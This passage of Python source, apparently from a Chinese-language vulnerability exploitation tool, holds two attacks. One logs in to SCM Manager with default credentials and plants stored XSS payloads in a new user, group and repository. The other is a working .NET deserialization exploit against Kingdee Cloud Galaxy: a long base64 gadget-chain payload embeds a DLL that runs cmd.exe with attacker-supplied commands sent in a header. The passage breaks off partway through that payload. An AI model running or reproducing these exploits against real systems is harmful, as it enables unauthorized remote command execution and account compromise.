                            with open("output.txt", "a") as file:
                                file.write(f"[+] {url} 登录成功，存在SCM Manager默认密码！！！！" + "\n")
                                file.write(res + "\n")
                            new_user = {

                                "name": "newUser",
                                "displayName": "<img src=x onerror=alert('XSS')>",
                                "mail": "",
                                "password": "",
                                "admin": False,
                                "active": True,
                                "type": "xml"

                            }
                            create_user = session.post(users, json=new_user)
                            self.append_to_output("[+] 用XSS代码完成create_user创建，请用浏览器请求URL进行验证", "yellow")

                            new_group = {

                                "name": "newGroup",
                                "description": "<img src=x onerror=alert('XSS')>",
                                "type": "xml"

                            }

                            create_group = session.post(groups, json=new_group)
                            self.append_to_output("[+] 用XSS代码完成create_group创建，请用浏览器请求URL进行验证", "yellow")

                            new_repo = {

                                "name": "newRepo",
                                "type": "svn",
                                "contact": "",
                                "description": "<img src=x onerror=alert('XSS')>",
                                "public": False

                            }

                            create_repo = session.post(repos, json=new_repo)
                            self.append_to_output("[+] 用XSS代码完成new_repo创建，请用浏览器请求URL进行验证", "yellow")
                        else:
                            self.append_to_output(f"[-] {url} 登录不成功，不存在SCM Manager默认密码", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "39.金蝶云星空管理中心存在反序列化命令执行":
                    if url.endswith("/"):
                        path = "Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc"
                    else:
                        path = "/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    main_url = url + path

                    headers_one = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                        "Accept": "*/*",
                        "Content-Type": "text/json",
                        "cmd": "ipconfig",
                        "Content-Length": "15944",
                    }
                    headers_two = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                        "Accept": "*/*",
                        "Content-Type": "text/json",
                        "cmd": "ifconfig",
                        "Content-Length": "15944",
                    }

                    post_data = {
                        "ap0": "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMctAAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMAAAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3IrT2JqZWN0U3Vycm9nYXRlK09iamVjdFNlcmlhbGl6ZWRSZWYCAAAABHR5cGULbWVtYmVyRGF0YXMDBR9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyDgAAAAkPAAAACRAAAAABBQAAAAQAAAAJEQAAAAkSAAAAAQYAAAAEAAAACRMAAAAJFAAAAAEHAAAABAAAAAkVAAAACRYAAAABCAAAAAQAAAAJFwAAAAkYAAAAAQkAAAAEAAAACRkAAAAJGgAAAAEKAAAABAAAAAkbAAAACRwAAAABCwAAAAQAAAAJHQAAAAkeAAAABAwAAAAcU3lzdGVtLkNv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b2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAYiAAAATlN5c3RlbS5Db3JlLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAQAAAABwAAAAkDAAAACgkkAAAACggIAAAAAAoICAEAAAABEQAAAA8AAAAGJQAAAPUCU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABASAAAABwAAAAkEAAAACgkoAAAACggIAAAAAAoICAEAAAABEwAAAA8AAAAGKQAAAN8DU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFAAAAAcAAAAJBQAAAAoJLAAAAAoICAAAAAAKCAgBAAAAARUAAAAPAAAABi0AAADmAlN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFgAAAAcAAAAJBgAAAAkwAAAACTEAAAAKCAgAAAAACggIAQAAAAEXAAAADwAAAAYyAAAA7wFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABAYAAAABwAAAAkHAAAACgk1AAAACggIAAAAAAoICAEAAAABGQAAAA8AAAAGNgAAAClTeXN0ZW0uV2ViLlVJLldlYkNvbnRyb2xzLlBhZ2VkRGF0YVNvdXJjZQQAAAAGNwAAAE1TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYRAaAAAABwAAAAkIAAAACAgAAAAACAgKAAAACAEACAEACAEACAgAAAAAARsAAAAPAAAABjkAAAApU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5EZXNpZ25lclZlcmIEAAAABjoAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAcAAAABQAAAA0CCTsAAAAICAMAAAAJCwAAAAEdAAAADwAAAAY9AAAANFN5c3RlbS5SdW50aW1lLlJlbW90aW5nLkNoYW5uZWxzLkFnZ3JlZ2F0ZURpY3Rpb25hcnkEAAAABj4AAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5EB4AAAABAAAACQkAAAAQHwAAAAIAAAAJCgAAAAkKAAAAECAAAAACAAAABkEAAAAACUEAAAAEJAAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAgAAAAhEZWxlZ2F0ZQdtZXRob2QwAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCUIAAAAJQwAAAAEoAAAAJAAAAAlEAAAACUUAAAABLAAAACQAAAAJRgAAAAlHAAAAATAAAAAkAAAACUgAAAAJSQAAAAExAAAAJAAAAAlKAAAACUsAAAABNQAAACQAAAAJTAAAAAlNAAAAATsAAAAEAAAACU4AAAAJTwAAAARCAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BlAAAADVAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABlIAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGUwAAAARMb2FkCgRDAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQlTAAAACT4AAAAJUgAAAAZWAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQZXAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgFEAAAAQgAAAAZYAAAAzAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAACVIAAAAGWwAAAAhHZXRUeXBlcwoBRQAAAEMAAAAJWwAAAAk+AAAACVIAAAAGXgAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkGXwAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkIAAAACgFGAAAAQgAAAAZgAAAAtgNTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZiAAAAhAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GYwAAAA1HZXRFbnVtZXJhdG9yCgFHAAAAQwAAAAljAAAACT4AAAAJYgAAAAZmAAAARVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbU3lzdGVtLlR5cGVdIEdldEVudW1lcmF0b3IoKQZnAAAAlAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0gR2V0RW51bWVyYXRvcigpCAAAAAoBSAAAAEIAAAAGaAAAAMACU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQm9vbGVhbiwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZqAAAAHlN5c3RlbS5Db2xsZWN0aW9ucy5JRW51bWVyYXRvcgZrAAAACE1vdmVOZXh0CgFJAAAAQwAAAAlrAAAACT4AAAAJagAAAAZuAAAAEkJvb2xlYW4gTW92ZU5leHQ